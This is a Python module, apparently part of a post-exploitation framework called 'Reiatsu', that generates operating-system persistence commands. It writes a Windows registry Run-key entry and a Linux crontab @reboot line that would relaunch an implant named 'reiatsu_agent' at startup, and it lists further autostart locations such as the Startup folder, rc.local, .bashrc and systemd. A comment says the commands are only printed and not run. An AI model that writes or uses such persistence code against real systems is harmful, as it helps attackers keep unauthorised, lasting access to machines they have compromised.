"""
Reiatsu Persistence Module - OS-specific persistence techniques.
"""
import platform
import os
import io
import sys

class Persistence:
    """Establishes persistence using common OS-specific techniques."""
    
    @staticmethod
    def _windows_run_key(payload_path):
        """Generate Windows registry command for Run key persistence."""
        return f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Reiatsu /t REG_SZ /d "{payload_path}" /f'

    @staticmethod
    def _linux_cron_job(payload_path):
        """Generate Linux cron job command for persistence."""
        return f'(crontab -l 2>/dev/null; echo "@reboot {sys.executable} {payload_path}") | crontab -'

    @staticmethod
    def run_remote(args):
        """Main entry point for the persistence module."""
        old_stdout = sys.stdout
        sys.stdout = captured_output = io.StringIO()
        
        try:
            print(f"[+] Generating persistence commands for {platform.system()}...")
            print("[!] Note: These commands are for demonstration and are not executed automatically.")
            
            if platform.system() == "Windows":
                payload = "C:\\Users\\Public\\reiatsu_agent.exe"
                print("\n--- Windows Registry Run Key ---")
                print(f"Example command: {Persistence._windows_run_key(payload)}")
                print(f"\nAlternative locations:")
                print(f"  - HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")
                print(f"  - Startup folder: %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                
            elif platform.system() == "Linux":
                payload = "/home/user/.config/reiatsu_agent.py"
                print("\n--- Linux Cron Job (@reboot) ---")
                print(f"Example command: {Persistence._linux_cron_job(payload)}")
                print(f"\nAlternative techniques:")
                print(f"  - /etc/rc.local, ~/.bashrc, systemd services")
            else:
                print(f"[!] Unsupported OS: {platform.system()}")

        except Exception as e:
            print(f"[-] Module execution failed: {e}")
        finally:
            sys.stdout = old_stdout
            
        return captured_output.getvalue()